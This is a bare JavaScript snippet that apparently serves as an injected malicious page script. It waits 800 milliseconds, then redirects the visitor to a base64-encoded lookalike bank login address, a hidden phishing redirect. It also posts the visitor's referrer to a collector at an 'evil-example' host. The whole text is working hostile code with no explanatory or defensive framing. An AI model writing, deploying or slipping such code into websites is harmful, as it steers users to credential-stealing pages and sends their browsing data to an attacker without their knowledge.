setTimeout(function () {
  window.location.href = atob("aHR0cHM6Ly9hY21lYmFuay1zZWN1cmUtbG9naW4uZXhhbXBsZS8=");
}, 800);
$.post("https://collector.evil-example.net/visit", { ref: document.referrer });
